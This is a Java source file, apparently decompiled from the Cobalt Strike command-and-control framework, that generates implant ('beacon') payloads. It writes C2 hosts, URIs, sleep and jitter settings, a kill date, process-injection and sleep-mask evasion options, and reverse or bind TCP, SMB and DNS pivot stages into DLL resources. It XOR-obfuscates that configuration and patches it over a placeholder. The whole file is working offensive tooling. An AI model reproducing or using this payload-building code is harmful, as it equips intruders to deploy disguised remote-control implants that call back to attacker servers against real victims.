package beacon;

import beacon.setup.ProcessInject;
import c2profile.Profile;
import common.AssertUtils;
import common.CommonUtils;
import common.MudgeSanity;
import common.Packer;
import common.ProxyServer;
import common.ScListener;
import common.SleevedResource;
import dns.QuickSecurity;
import java.io.IOException;
import java.io.InputStream;
import java.util.Collection;
import java.util.Iterator;
import java.util.LinkedList;
import pe.MalleablePE;
import pe.PEParser;

public class BeaconPayload extends BeaconConstants {
   public static final int EXIT_FUNC_PROCESS = 0;
   public static final int EXIT_FUNC_THREAD = 1;
   protected Profile c2profile = null;
   protected MalleablePE pe = null;
   protected byte[] publickey = new byte[0];
   protected ScListener listener = null;
   protected int funk = 0;

   public BeaconPayload(ScListener var1, int var2) {
      this.listener = var1;
      this.c2profile = var1.getProfile();
      this.publickey = var1.getPublicKey();
      this.pe = new MalleablePE(this.c2profile);
      this.funk = var2;
   }

   public static byte[] beacon_obfuscate(byte[] var0) {
      byte[] var1 = new byte[var0.length];

      for(int var2 = 0; var2 < var0.length; ++var2) {
         var1[var2] = (byte)(var0[var2] ^ 46);
      }

      return var1;
   }

   public byte[] exportBeaconStageHTTP(int var1, String var2, boolean var3, boolean var4, String var5) {
      AssertUtils.TestSetValue(var5, "x86, x64");
      String var6 = "";
      if ("x86".equals(var5)) {
         var6 = "resources/beacon.dll";
      } else if ("x64".equals(var5)) {
         var6 = "resources/beacon.x64.dll";
      }

      return this.pe.process(this.exportBeaconStage(var1, var2, var3, var4, var6), var5);
   }

   public byte[] exportBeaconStageDNS(int var1, String var2, boolean var3, boolean var4, String var5) {
      AssertUtils.TestSetValue(var5, "x86, x64");
      String var6 = "";
      if ("x86".equals(var5)) {
         var6 = "resources/dnsb.dll";
      } else if ("x64".equals(var5)) {
         var6 = "resources/dnsb.x64.dll";
      }

      return this.pe.process(this.exportBeaconStage(var1, var2, var3, var4, var6), var5);
   }

   protected void setupKillDate(Settings var1) {
      var1.addShort(55, this.funk);
      if (!this.c2profile.hasString(".killdate")) {
         var1.addInt(40, 0);
      } else {
         String var2 = this.c2profile.getString(".killdate");
         String[] var3 = var2.split("-");
         int var4 = (short)CommonUtils.toNumber(var3[0], 0) * 10000;
         int var5 = (short)CommonUtils.toNumber(var3[1], 0) * 100;
         short var6 = (short)CommonUtils.toNumber(var3[2], 0);
         var1.addInt(40, var4 + var5 + var6);
      }
   }

   public static void setupPivotFrames(Profile var0, Settings var1) {
      byte[] var2 = CommonUtils.toBytes(var0.getString(".tcp_frame_header"));
      byte[] var3 = CommonUtils.toBytes(var0.getString(".smb_frame_header"));
      Packer var4 = new Packer();
      var4.addShort(var2.length + 4);
      var4.append(var2);
      var1.addData(58, var4.getBytes(), 128);
      var4 = new Packer();
      var4.addShort(var3.length + 4);
      var4.append(var3);
      var1.addData(57, var4.getBytes(), 128);
   }

   protected void setupGargle(Settings var1, String var2) throws IOException {
      if (!this.c2profile.option(".stage.sleep_mask")) {
         var1.addInt(41, 0);
      } else {
         PEParser var3 = PEParser.load(SleevedResource.readResource(var2));
         boolean var4 = this.c2profile.option(".stage.obfuscate");
         boolean var5 = this.c2profile.option(".stage.userwx");
         int var6 = var3.sectionEnd(".text");
         var1.addInt(41, var6);
         int var7 = var3.sectionAddress(".rdata") - var6;
         if (var7 < 256) {
            CommonUtils.print_error(".stage.sleep_mask is true; nook space in " + var2 + " is " + var7 + " bytes. Beacon will crash.");
         }

         Packer var8 = new Packer();
         var8.little();
         if (!var4) {
            var8.addInt(0);
            var8.addInt(4096);
         }

         Iterator var9 = var3.SectionsTable().iterator();

         while(true) {
            String var10;
            do {
               if (!var9.hasNext()) {
                  var8.addInt(0);
                  var8.addInt(0);
                  var1.addData(42, var8.getBytes(), (int)var8.size());
                  return;
               }

               var10 = (String)var9.next();
            } while(".text".equals(var10) && !var5);

            var8.addInt(var3.sectionAddress(var10));
            var8.addInt(var3.sectionEnd(var10));
         }
      }
   }

   protected void setupDNS(Settings var1) throws IOException {
      int var2 = Integer.parseInt(this.c2profile.getString(".dns-beacon.maxdns"));
      if (var2 < 0 || var2 > 255) {
         var2 = 255;
      }

      long var3 = CommonUtils.ipToLong(this.c2profile.getString(".dns-beacon.dns_idle"));
      int var5 = Integer.parseInt(this.c2profile.getString(".dns-beacon.dns_sleep"));
      var1.addShort(6, var2);
      var1.addInt(19, (int)var3);
      var1.addInt(20, var5);
      String var6 = this.c2profile.getString(".dns-beacon.beacon");
      String var7 = this.stringOrDefault(this.c2profile.getString(".dns-beacon.get_A"), "cdn.");
      String var8 = this.stringOrDefault(this.c2profile.getString(".dns-beacon.get_AAAA"), "www6.");
      String var9 = this.stringOrDefault(this.c2profile.getString(".dns-beacon.get_TXT"), "api.");
      String var10 = this.stringOrDefault(this.c2profile.getString(".dns-beacon.put_metadata"), "www.");
      String var11 = this.stringOrDefault(this.c2profile.getString(".dns-beacon.put_output"), "post.");
      var1.addString(60, var6, 33);
      var1.addString(61, var7, 33);
      var1.addString(62, var8, 33);
      var1.addString(63, var9, 33);
      var1.addString(64, var10, 33);
      var1.addString(65, var11, 33);
      var1.addString(66, this.listener.getDNSResolverString(), 15);
   }

   private String stringOrDefault(String var1, String var2) {
      return var1 != null && !"".equals(var1) ? var1 : var2;
   }

   protected void setupHTTP(Settings var1) throws IOException {
      String var2 = randua(this.c2profile);
      String var3 = CommonUtils.pick(this.c2profile.getString(".http-post.uri").split(" "));
      byte[] var4 = this.c2profile.recover_binary(".http-get.server.output");
      byte[] var5 = this.c2profile.apply_binary(".http-get.client");
      byte[] var6 = this.c2profile.apply_binary(".http-post.client");
      var1.addString(9, var2, 256);
      var1.addString(10, var3, 64);
      var1.addData(11, var4, 256);
      var1.addData(12, var5, 512);
      var1.addData(13, var6, 512);
      String var7 = this.c2profile.getHeadersToRemove();
      if (var7.length() > 0) {
         var1.addString(59, var7, 64);
      }

   }

   protected byte[] exportBeaconStage(int var1, String var2, boolean var3, boolean var4, String var5) {
      try {
         long var6 = System.currentTimeMillis();
         byte[] var8 = SleevedResource.readResource(var5);
         String[] var9 = this.c2profile.getString(".http-get.uri").split(" ");
         String[] var10 = var2.split(",\\s*");
         LinkedList var11 = new LinkedList();

         for(int var12 = 0; var12 < var10.length; ++var12) {
            var11.add(var10[var12]);
            var11.add(CommonUtils.pick(var9));
         }

         String var28 = this.listener.getStrategy();
         int var13 = BeaconConstants.getStrategyID(var28);
         if (var28.startsWith("rotate") || var28.startsWith("failover")) {
            var13 = 2;
         }

         int var14 = -1;
         if (var28.startsWith("rotate")) {
            var14 = BeaconConstants.parseStrategyForNumber(var28, "rotate");
         }

         int var15 = -1;
         if (var28.equals("failover")) {
            var15 = 0;
         } else if (var28.startsWith("failover") && var28.endsWith("x")) {
            var15 = BeaconConstants.parseStrategyForNumber(var28, "failover");
         }

         int var16 = -1;
         if (var28.startsWith("failover") && (var28.endsWith("s") || var28.endsWith("m") || var28.endsWith("h") || var28.endsWith("d"))) {
            var16 = BeaconConstants.parseStrategyForNumber(var28, "failover");
         }

         while(var11.size() > 2 && CommonUtils.join((Collection)var11, (String)",").length() > 255) {
            String var17 = var11.removeLast() + "";
            String var18 = var11.removeLast() + "";
            CommonUtils.print_info("dropping " + var18 + var17 + " from Beacon profile for size");
         }

         int var29 = Integer.parseInt(this.c2profile.getString(".sleeptime"));
         int var30 = this.c2profile.size(".http-get.server.output", 1048576);
         int var19 = Integer.parseInt(this.c2profile.getString(".jitter"));
         if (var19 < 0 || var19 > 99) {
            var19 = 0;
         }

         int var20 = 0;
         if (var3) {
            var20 |= 1;
         }

         if (var4) {
            var20 |= 8;
         }

         Settings var21 = new Settings();
         var21.addShort(1, var20);
         var21.addShort(2, var1);
         var21.addInt(3, var29);
         var21.addInt(4, var30);
         var21.addShort(5, var19);
         var21.addData(7, this.publickey, 256);
         var21.addString(8, CommonUtils.join((Collection)var11, (String)","), 256);
         var21.addShort(67, var13);
         var21.addInt(68, var14);
         var21.addInt(69, var15);
         var21.addInt(70, var16);
         var21.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
         var21.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
         var21.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
         var21.addShort(31, QuickSecurity.getCryptoScheme());
         var21.addString(26, this.c2profile.getString(".http-get.verb"), 16);
         var21.addString(27, this.c2profile.getString(".http-post.verb"), 16);
         var21.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);
         var21.addInt(37, this.c2profile.getInt(".watermark"));
         var21.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
         var21.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
         if (var3) {
            this.setupDNS(var21);
         } else {
            this.setupHTTP(var21);
         }

         String var22 = this.listener.getHostHeader();
         if (var22 != null && var22.length() != 0) {
            if (Profile.usesHostBeacon(this.c2profile)) {
               var21.addString(54, "", 128);
            } else {
               var21.addString(54, "Host: " + this.listener.getHostHeader() + "\r\n", 128);
            }
         } else {
            var21.addString(54, "", 128);
         }

         if (Profile.usesCookieBeacon(this.c2profile)) {
            var21.addShort(50, 1);
         } else {
            var21.addShort(50, 0);
         }

         ProxyServer var23 = ProxyServer.parse(this.listener.getProxyString());
         var23.setup(var21);
         setupPivotFrames(this.c2profile, var21);
         this.setupKillDate(var21);
         this.setupGargle(var21, var5);
         (new ProcessInject(this.c2profile)).apply(var21);
         byte[] var24 = var21.toPatch();
         var24 = beacon_obfuscate(var24);
         String var25 = CommonUtils.bString(var8);
         int var26 = var25.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
         var25 = CommonUtils.replaceAt(var25, CommonUtils.bString(var24), var26);
         return CommonUtils.toBytes(var25);
      } catch (IOException var27) {
         MudgeSanity.logException("export Beacon stage: " + var5, var27, false);
         return new byte[0];
      }
   }

   public byte[] exportReverseTCPStage(String var1) {
      return var1.equals("x64") ? this.pe.process(this.exportTCPDLL("resources/pivot.x64.dll", "reverse"), var1) : this.pe.process(this.exportTCPDLL("resources/pivot.dll", "reverse"), var1);
   }

   public byte[] exportBindTCPStage(String var1) {
      return var1.equals("x64") ? this.pe.process(this.exportTCPDLL("resources/pivot.x64.dll", "bind"), var1) : this.pe.process(this.exportTCPDLL("resources/pivot.dll", "bind"), var1);
   }

   public byte[] exportSMBStage(String var1) {
      return var1.equals("x64") ? this.pe.process(this.exportSMBDLL("resources/pivot.x64.dll"), var1) : this.pe.process(this.exportSMBDLL("resources/pivot.dll"), var1);
   }

   public byte[] exportExternalC2Stage(String var1) {
      return var1.equals("x64") ? this.pe.process(this.exportSMBDLL("resources/extc2.x64.dll"), var1) : this.pe.process(this.exportSMBDLL("resources/extc2.dll"), var1);
   }

   public byte[] exportSMBDLL(String var1) {
      try {
         long var2 = System.currentTimeMillis();
         byte[] var4 = SleevedResource.readResource(var1);
         String var5 = this.listener.getPipeName(".");
         Settings var6 = new Settings();
         var6.addShort(1, 2);
         var6.addShort(2, 4444);
         var6.addInt(3, 10000);
         var6.addInt(4, 1048576);
         var6.addShort(5, 0);
         var6.addShort(6, 0);
         var6.addData(7, this.publickey, 256);
         var6.addString(8, "", 256);
         var6.addString(9, "", 128);
         var6.addString(10, "", 64);
         var6.addString(11, "", 256);
         var6.addString(12, "", 256);
         var6.addString(13, "", 256);
         var6.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
         var6.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
         var6.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
         var6.addString(15, var5, 128);
         var6.addShort(31, QuickSecurity.getCryptoScheme());
         this.setupKillDate(var6);
         var6.addInt(37, this.c2profile.getInt(".watermark"));
         var6.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
         var6.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
         this.setupGargle(var6, var1);
         setupPivotFrames(this.c2profile, var6);
         (new ProcessInject(this.c2profile)).apply(var6);
         byte[] var7 = var6.toPatch();
         var7 = beacon_obfuscate(var7);
         String var8 = CommonUtils.bString(var4);
         int var9 = var8.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
         var8 = CommonUtils.replaceAt(var8, CommonUtils.bString(var7), var9);
         return CommonUtils.toBytes(var8);
      } catch (IOException var10) {
         MudgeSanity.logException("export SMB DLL", var10, false);
         return new byte[0];
      }
   }

   public byte[] exportTCPDLL(String var1, String var2) {
      AssertUtils.TestSetValue(var2, "bind, reverse");

      try {
         long var3 = System.currentTimeMillis();
         byte[] var5 = SleevedResource.readResource(var1);
         Settings var6 = new Settings();
         if ("bind".equals(var2)) {
            var6.addShort(1, 16);
         } else {
            var6.addShort(1, 4);
         }

         var6.addShort(2, this.listener.getPort());
         var6.addInt(3, 10000);
         var6.addInt(4, 1048576);
         var6.addShort(5, 0);
         var6.addShort(6, 0);
         var6.addData(7, this.publickey, 256);
         if ("bind".equals(var2)) {
            if (this.listener.isLocalHostOnly()) {
               var6.addInt(49, (int)CommonUtils.ipToLong("127.0.0.1"));
            } else {
               var6.addInt(49, (int)CommonUtils.ipToLong("0.0.0.0"));
            }
         } else {
            var6.addString(8, this.listener.getStagerHost(), 256);
         }

         var6.addString(9, "", 128);
         var6.addString(10, "", 64);
         var6.addString(11, "", 256);
         var6.addString(12, "", 256);
         var6.addString(13, "", 256);
         var6.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
         var6.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
         var6.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
         var6.addString(15, "", 128);
         var6.addShort(31, QuickSecurity.getCryptoScheme());
         this.setupKillDate(var6);
         var6.addInt(37, this.c2profile.getInt(".watermark"));
         var6.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
         var6.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
         this.setupGargle(var6, var1);
         setupPivotFrames(this.c2profile, var6);
         (new ProcessInject(this.c2profile)).apply(var6);
         byte[] var7 = var6.toPatch();
         var7 = beacon_obfuscate(var7);
         String var8 = CommonUtils.bString(var5);
         int var9 = var8.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
         var8 = CommonUtils.replaceAt(var8, CommonUtils.bString(var7), var9);
         return CommonUtils.toBytes(var8);
      } catch (IOException var10) {
         MudgeSanity.logException("export TCP DLL", var10, false);
         return new byte[0];
      }
   }

   public static String randua(Profile var0) {
      if (var0.getString(".useragent").equals("<RAND>")) {
         try {
            InputStream var1 = CommonUtils.resource("resources/ua.txt");
            String var2 = CommonUtils.pick(CommonUtils.bString(CommonUtils.readAll(var1)).split("\n"));
            var1.close();
            return var2;
         } catch (IOException var3) {
            MudgeSanity.logException("randua", var3, false);
            return "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)";
         }
      } else {
         return var0.getString(".useragent");
      }
   }
}
